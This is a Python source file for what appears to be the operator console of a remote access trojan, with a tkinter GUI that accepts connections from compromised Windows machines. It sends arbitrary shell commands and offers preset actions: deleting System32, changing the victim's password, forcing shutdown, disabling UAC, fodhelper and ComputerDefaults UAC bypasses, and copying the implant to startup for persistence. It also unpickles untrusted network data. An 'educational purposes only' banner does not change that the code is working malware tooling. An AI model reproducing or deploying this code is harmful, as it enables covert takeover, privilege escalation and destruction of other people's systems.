
from threading import Thread
from socket import socket,AF_INET,SOCK_STREAM
from pickle import loads,dumps
from tkinter.messagebox import showerror
from tkinter import END,Text,Label,Listbox,Tk,Entry,Button,StringVar,Scrollbar
from sys import exit,argv
from zlib import compress,decompress
from os.path import exists,dirname,join
from ctypes import windll
from time import sleep
__author__="Vahab Programmer https://Github.com/Vahab-Programmer"
__version__="0.0.1"
commands_list = {}
def save_commands()->None:
    data = dumps(commands_list)
    data = compress(data)
    with open(join(dirname(argv[0]),"commands.dat"), "wb") as comp:
        comp.write(data)
class RunServer(object):
    __client={}
    __current_client=None
    __current_hostname=None
    __Threads=[]
    def __init__(self):
        self.__default_commands={
        "Lock PC":lambda:self.__send_command(cmd="rundll32 user32.dll,LockWorkStation"),
        "Delete System32":lambda:self.__send_command(cmd="fdr C:\\Windows\\System32"),
        "Suspend":lambda:(self.__send_command(cmd="rundll32 powrprof.dll,SetSuspendState")),
        "Change Password":self.__change_password,
        "Shutdown":lambda:self.__send_command(cmd="shutdown /s /f /t 0"),
        "Start Process":self.__start_proc}
        self.__socket=socket(AF_INET,SOCK_STREAM)
        self.__socket.bind(("0.0.0.0",8085))
        self.__socket.listen(100)
        self.__handle=Thread(target=self.__handle_new_client)
        self.__bar_handle=Thread(target=self.__bar_motion)
        self.__gui()
    @staticmethod
    def __center(win:Tk)->None:win.update();win.geometry("+{}+{}".format((win.winfo_screenwidth()//2)-(win.winfo_width()//2),(win.winfo_screenheight()//2)-(win.winfo_height()//2)))
    def __close_command(self)->None:
        self.root.attributes("-disabled",0)
        self.croot.destroy()
    def __recv(self,client,hostname)->None:
        self.textbox.delete("1.0",END)
        try:self.textbox.insert("1.0",client.recv(52428800))
        except ConnectionResetError:self.__exit(name=hostname)
        except ConnectionAbortedError:self.__exit(name=hostname)
    def __kill_thread(self,thread)->None:
        tid = thread.ident
        if tid is None:pass
        kernel=windll.kernel32
        handle = kernel.OpenThread(1, 0, tid)
        if handle:
            kernel.TerminateThread(handle, 0)
            kernel.CloseHandle(handle)
    def __infinity_animation(self,text:str,width:int=8) -> str:
        base=" "*(width - width // 4)
        string=iter(text+base)
        current=[" "]*width*3
        yield "".join(current)
        while True:
            try:tmp = string.__next__()
            except StopIteration:
                string = iter(text + base)
                tmp = string.__next__()
            current.pop(0)
            current.append(tmp)
            yield "".join(current)
    def __bar_motion(self)->None:
        for frame in self.__infinity_animation("This App Created By Vahab Programmer Github Page: https://github.com/Vahab-Programmer  Disclaimer Warning! This Program Is For Educational Purposes only!",width=120):
            try:self.bar.set(frame)
            except RuntimeError:break
            sleep(0.1)
    def __send_command(self,event=None,cmd:str="")->None:
        if self.__current_client == None:
            return None
        data=self.command.get()
        self.command.set("")
        if cmd=="" and data =="":return None
        if cmd:
            try:
                self.__current_client.send(cmd.encode())
                tmp=Thread(target=self.__recv,args=(self.__current_client,self.__current_hostname))
                self.__Threads.append(tmp)
                tmp.start()
                if len(self.__Threads)>1:
                    older = self.__Threads[0]
                    if older.is_alive():self.__kill_thread(older)
                    else:older.join()
                    del self.__Threads[0]
            except ConnectionResetError:self.__exit()
            except ConnectionAbortedError:self.__exit()
            return None
        try:
            self.__current_client.send(data.encode())
            tmp=Thread(target=self.__recv,args=(self.__current_client,self.__current_hostname))
            self.__Threads.append(tmp)
            if len(self.__Threads) > 1:
                older=self.__Threads[0]
                if older.is_alive():self.__kill_thread(older)
                else :older.join()
                del self.__Threads[0]
            tmp.start()
        except ConnectionResetError:self.__exit()
        except ConnectionAbortedError:self.__exit()
    def __start_proc_cmd(self,proc:str)->None:
        if not proc:showerror("Error","You Should Fill The App Path Field!");return None
        self.__send_command(cmd="cmd /C start {}".format(proc))
        self.__close_command()
    def __start_proc(self)->None:
        self.root.attributes("-disabled", 1)
        root = Tk()
        self.croot = root
        root.title("Start New Process")
        root.resizable(False, False)
        root.geometry("290x80")
        self.__center(root)
        root.protocol("WM_DELETE_WINDOW", self.__close_command)
        apppath = StringVar(root)
        Label(root, text="App Path").grid(row=0, column=0, pady=5)
        appath=Entry(root, textvariable=apppath, width=38)
        appath.bind("<Return>",lambda e:self.__start_proc_cmd(apppath.get()))
        appath.grid(row=0, column=1)
        Button(root, text="Start", width=35,command=lambda:self.__start_proc_cmd(apppath.get())).grid(row=3,column=0,columnspan=2,pady=10)
        root.mainloop()
    def __close(self)->None:
        self.__socket.close()
        self.root.destroy()
        save_commands()
        exit(0)
    def __set_to_None(self)->None:
        self.username.set("Username:")
        self.release.set("Release:")
        self.isadmin.set("Is User An Admin:")
        self.processor.set("Processor:")
        self.machine.set("Machine:")
        self.hostname.set("Hostname:")
    def __rem_client(self)->None:
        client_num=self.lista.curselection()
        if not client_num:showerror("Error","You Don't Have Selected Any Client!");return None
        client=self.lista.get(client_num)
        try:
            self.__client[client][0].send("exit".encode())
            self.__client[client][0].close()
            del self.__client[client]
        except KeyError:pass
        except ConnectionResetError:pass
        except ConnectionAbortedError:pass
        self.lista.delete(client_num)
        self.__set_to_None()
    def __exit(self,name:str=None)->None:
        if not self.__current_hostname and not name:return None
        hostname =name or self.__current_hostname
        clients = list(self.lista.get(0,END))
        try:
            client_num=clients.index(hostname)
            self.lista.delete(client_num)
        except ValueError:pass
        try:
            self.__client[hostname][0].send("exit".encode())
            self.__client[hostname][0].close()
            del self.__client[hostname]
        except ConnectionResetError:pass
        except ConnectionAbortedError:pass
        except KeyError:pass
        self.__current_hostname=None
        self.__current_client=None
        self.__set_to_None()
    def __select(self,event=None)->None:
        name=self.lista.get(self.lista.curselection())
        if name=="":showerror("Error","You Not Selected Any Client!");return None
        self.__current_hostname=name
        temp=self.__client.get(name)
        if temp ==None:self.__rem_client();return None
        self.__current_client,info=temp
        self.isadmin.set("Is User An Admin: "+("True" if info.get("admin") else "False"))
        self.hostname.set("Hostname: "+info.get("node"))
        self.machine.set("Machine: "+info.get("machine"))
        self.processor.set("Processor: "+info.get("processor"))
        self.release.set("Release: "+info.get("release"))
        self.username.set("Username: "+info.get("username"))
    def __refresh(self)->None:
        try:
            tmp=self.__client.copy()
            self.lista.delete(0,END)
            for name,value in tmp.items():
                value[0].close()
                del self.__client[name]
            self.__current_hostname=None
            self.__current_client=None
            self.__set_to_None()
            self.textbox.delete("1.0",END)
        except Exception as err:pass
    def __save_command(self,label:str,command:str)->None:
        if not label:showerror("Error","You Should Fill The Label Field!");return None
        if not command:showerror("Error","You Should Fill The Command Field!");return None
        if label in commands_list or label in self.__default_commands:showerror("Error","Label Name Exists in List!");return None
        commands_list[label]=command
        self.commands.insert(END,label)
        self.__close_command()
    def __change_command_data(self,label:str,command:str,index:int)->None:
        if not label:showerror("Error","You Should Fill The Label Field!");return None
        if not command:showerror("Error","You Should Fill The Command Field!");return None
        commands_list[label]=command
        self.commands.delete(index)
        self.commands.insert(index,label)
        self.__close_command()
    def __change_command(self)->None:
        target_command_num=self.commands.curselection()
        if target_command_num==():showerror("Error","Please Select A Command To Change!");return None
        target_command=self.commands.get(target_command_num)
        if target_command in self.__default_commands:showerror("Error","You Cannot Change The Default Commands!");return None
        self.root.attributes("-disabled", 1)
        root = Tk()
        self.croot = root
        root.title("Change Command")
        root.resizable(False, False)
        root.geometry("300x110")
        self.__center(root)
        root.protocol("WM_DELETE_WINDOW", self.__close_command)
        label = StringVar(root)
        command = StringVar(root)
        label.set(target_command)
        command.set(commands_list[target_command])
        Label(root,text="Label").grid(row=0, column=0, pady=5)
        Label(root,text="Command").grid(row=1, column=0)
        a=Entry(root,textvariable=label, width=38)
        a.bind("<Return>",lambda e:self.__change_command_data(label.get(), command.get(),target_command_num))
        a.grid(row=0, column=1)
        sb = Scrollbar(root, orient="horizontal")
        cmd = Entry(root, textvariable=command, width=38, xscrollcommand=sb.set)
        cmd.bind("<Return>",lambda e:self.__change_command_data(label.get(), command.get(),target_command_num))
        sb.config(command=cmd.xview)
        cmd.grid(row=1, column=1)
        sb.grid(row=2, column=1, ipadx=90)
        Button(root,text="Change", width=35, command=lambda:self.__change_command_data(label.get(), command.get(),target_command_num)).grid(row=3,column=0,columnspan=2,pady=10)
        root.mainloop()
    def __add_command(self)->None:
        self.root.attributes("-disabled",1)
        root=Tk()
        self.croot=root
        root.title("Add Command")
        root.resizable(False, False)
        root.geometry("300x110")
        self.__center(root)
        root.protocol("WM_DELETE_WINDOW",self.__close_command)
        label = StringVar(root)
        command = StringVar(root)
        Label(root,text="Label").grid(row=0, column=0, pady=5)
        Label(root,text="Command").grid(row=1, column=0)
        a=Entry(root,textvariable=label, width=38)
        a.bind("<Return>",lambda e:self.__save_command(label.get(),command.get()))
        a.grid(row=0, column=1)
        sb=Scrollbar(root,orient="horizontal")
        cmd=Entry(root,textvariable=command, width=38,xscrollcommand=sb.set)
        cmd.bind("<Return>",lambda e:self.__save_command(label.get(),command.get()))
        sb.config(command=cmd.xview)
        cmd.grid(row=1, column=1)
        sb.grid(row=2,column=1,ipadx=90)
        Button(root,text="Save",width=35,command=lambda:self.__save_command(label.get(),command.get())).grid(row=3, column=0, columnspan=2, pady=10)
        root.mainloop()
    def __del_command(self)->None:
        target_command_num=self.commands.curselection()
        if target_command_num == (): showerror("Error", "Please Select A Command To Delete!");return None
        target_command=self.commands.get(target_command_num)
        if target_command in self.__default_commands:showerror("Error","Cannot Delete Default Commands!");return None
        self.commands.delete(target_command_num)
        del commands_list[target_command]
    def __execute_command(self,event=None)->None:
        if self.__current_client==None:showerror("Error","You Need To Select A Client!");return None
        target_command_num=self.commands.curselection()
        if target_command_num == (): showerror("Error", "Please Select A Command To send!");return None
        target_command=self.commands.get(target_command_num)
        try:
            command=commands_list[target_command]
            self.__send_command(cmd=command)
            return None
        except KeyError:pass
        command=self.__default_commands[target_command]
        command()
    def __show(self,button: Button, entry: Entry)->None:
        entry.config(show="")
        button.config(text="hide", command=lambda:self.__hide(button, entry))
    def __hide(self,button:Button,entry:Entry)->None:
        entry.config(show="*")
        button.config(text="show",command=lambda:self.__show(button, entry))
    def __save_password(self,passwd:str)->None:
        if passwd=="":showerror("Error","Password Cannot Be Nothing!");return None
        self.__send_command(cmd="net user %username% {}".format(passwd))
        self.__close_command()
    def __change_password(self)->None:
        self.root.attributes("-disabled",1)
        root=Tk()
        self.croot=root
        root.title("Change Passwd")
        root.resizable(False, False)
        root.geometry("300x70")
        self.__center(root)
        root.protocol("WM_DELETE_WINDOW",self.__close_command)
        passwd = StringVar(root)
        Label(root,text="Password").grid(row=0,column=0,pady=10)
        ety=Entry(root,textvariable=passwd,width=32,borderwidth=5,show="*")
        ety.bind("<Return>",lambda e:self.__save_password(passwd.get()))
        ety.grid(row=0,column=1)
        btn=Button(root,text="show",command=lambda:self.__show(btn, ety))
        btn.grid(row=0,column=2)
        Button(root,text="Save Password",command=lambda:self.__save_password(passwd.get())).grid(row=1,column=0,columnspan=3)
        root.mainloop()
    def __load_commands(self)->None:
        global commands_list
        for i in self.__default_commands.keys():
            self.commands.insert(END,i)
        if exists(join(dirname(argv[0]),"commands.dat")):
            with open(join(dirname(argv[0]),"commands.dat"),"rb") as comp:
                data=comp.read()
            data=decompress(data)
            data=loads(data)
            commands_list=data
            for i in data.keys():
                self.commands.insert(END,i)
    def __gui(self)->None:
        root=Tk()
        root.iconbitmap(".\\icon.ico")
        self.root=root
        root.title("Server V1")
        root.geometry("935x435")
        self.__center(root)
        root.resizable(False,False)
        root.protocol("WM_DELETE_WINDOW",self.__close)
        self.bar=StringVar(root)
        self.command=StringVar(root)
        self.hostname=StringVar(root)
        self.release=StringVar(root)
        self.machine=StringVar(root)
        self.processor=StringVar(root)
        self.isadmin=StringVar(root)
        self.username=StringVar(root)
        self.hostname.set("Hostname:")
        self.release.set("Release:")
        self.machine.set("Machine:")
        self.processor.set("Processor:")
        self.isadmin.set("Is User An Admin:")
        self.username.set("Username:")
        Label(root,textvariable=self.bar,font=("Tahoma",7),width=155,relief="raised").grid(row=0,column=0,columnspan=7)
        Label(root,text="Client's",font=("Tahoma",12)).grid(row=1,column=0)
        Label(root,text="Output",font=("Tahoma",12)).grid(row=1,column=2)
        Label(root,text="Command's",font=("Tahoma",12)).grid(row=1,column=5)
        self.lista=Listbox(root,width=35,height=15)
        self.commands=Listbox(root,width=35,height=15)
        self.__load_commands()
        sb=Scrollbar(root,orient="vertical",command=self.lista.yview)
        sb1=Scrollbar(root,orient="vertical")
        sb2=Scrollbar(root,orient="vertical",command=self.commands.yview)
        self.commands.config(yscrollcommand=sb2.set)
        self.textbox=Text(root,yscrollcommand=sb1.set,height=15,width=56)
        sb1.config(command=self.textbox.yview)
        self.lista.config(yscrollcommand=sb.set)
        self.lista.grid(row=2,column=0,pady=10)
        self.commands.grid(row=2,column=5)
        self.textbox.grid(row=2,column=2)
        sb.grid(row=2,column=1,ipady=96)
        sb1.grid(row=2,column=3,ipady=96)
        sb2.grid(row=2, column=6, ipady=96)
        command=Entry(root,textvariable=self.command,width=75)
        command.grid(row=3,column=2)
        command.bind("<Return>",self.__send_command)
        self.commands.bind("<Return>",self.__execute_command)
        self.lista.bind("<Return>", self.__select)
        Button(root,text="Delete Client",width=20,command=self.__rem_client).grid(row=3,column=0)
        Button(root,text="Send Command",width=20,command=self.__send_command).grid(row=4,column=2,sticky="w")
        Button(root,text="Disable UAC",width=20,command=lambda:self.__send_command(cmd="lua")).grid(row=5,column=2,sticky="w")
        Button(root,text="Fodhelper Bypass",width=20,command=lambda:self.__send_command(cmd="fodhelper")).grid(row=4,column=2,sticky="e")
        Button(root,text="ComputerDefaults Bypass",width=20,command=lambda:self.__send_command(cmd="computerdefaults")).grid(row=4,column=2)
        Button(root,text="Copy To Startup",width=20,command=lambda:self.__send_command(cmd="cys")).grid(row=5,column=2)
        Button(root,text="Exit",width=20,command=self.__exit).grid(row=5,column=2,sticky="e")
        Button(root,text="Select",width=20,command=self.__select).grid(row=4,column=0)
        Button(root,text="Refresh",width=20,command=self.__refresh).grid(row=5,column=0)
        Button(root,text="Send Command",width=20,command=self.__execute_command).grid(row=3,column=5)
        Button(root,text="Change Command",width=20,command=self.__change_command).grid(row=4,column=5)
        Button(root,text="Add New Command",width=20,command=self.__add_command).grid(row=5,column=5)
        Button(root,text="Delete Command",width=20,command=self.__del_command).grid(row=6,column=5)
        Label(root,textvariable=self.hostname).grid(row=6,column=2,sticky="w")
        Label(root,textvariable=self.release).grid(row=6,column=2)
        Label(root,textvariable=self.machine).grid(row=6,column=2,sticky="e")
        Label(root,textvariable=self.username).grid(row=6,column=0,sticky="w",ipadx=30)
        Label(root,textvariable=self.isadmin).grid(row=7,column=0,sticky="w",ipadx=30)
        Label(root,textvariable=self.processor).grid(row=7,column=2,sticky="w")
        self.__bar_handle.start()
        self.__handle.start()
        root.mainloop()
    def __handle_new_client(self)->None:
        while True:
            try:client,addr=self.__socket.accept()
            except OSError:break
            info=loads(client.recv(52428800))
            self.__client[info.get("node")+","+addr[0]+":"+str(addr[1])]=(client,info)
            self.lista.insert(END,info.get("node")+","+addr[0]+":"+str(addr[1]))
RunServer()
